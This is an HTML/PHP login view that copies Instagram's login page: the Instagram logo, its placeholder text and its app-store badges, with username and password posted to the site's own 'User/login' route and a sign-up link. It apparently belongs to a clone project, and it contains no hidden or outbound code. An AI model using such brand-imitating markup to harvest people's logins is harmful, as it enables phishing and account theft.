<body>
  <span id="root">
    <section class="section-all">
      <!-- 1-Role Main -->
      <main class="main" role="main">
        <div class="wrapper">
          <article class="article">
            <div class="content">
              <div class="login-box">
                <div class="header">
                  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
                </div><!-- Header end -->
                <div class="form-wrap">
                  <form class="form" action="<?=base_url()?>User/login" method="POST" enctype="multipart/form-data">

                    <div class="input-box">
                      <input type="text" id="email" aria-describedby="" placeholder="Phone number, username, or email" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" name="email" value="" required>
                    </div>

                    <div class="input-box">
                      <input type="password" name="password" id="password" placeholder="Password" aria-describedby="" maxlength="30" aria-required="true" autocapitalize="off" autocorrect="off" required>
                    </div>

                    <span class="button-box">
                      <button class="btn" type="submit" name="submit">Log in</button>
                    </span>

                  </form>
                  <a class="forgot" href="">Forgot password?</a>
                </div> <!-- Form-wrap end -->
              </div> <!-- Login-box end -->

              <div class="login-box">
                <p class="text">Don't have an account?<a href="<?=base_url()?>Home/register">Sign up</a></p>
              </div> <!-- Signup-box end -->

              <div class="app">
                <p>Get the app.</p>
                <div class="app-img">
                  <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png" >
                  </a>
                  <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png">
                  </a>
                </div>  <!-- App-img end-->
              </div> <!-- App end -->
            </div> <!-- Content end -->
          </article>
        </div> <!-- Wrapper end -->
      </main>
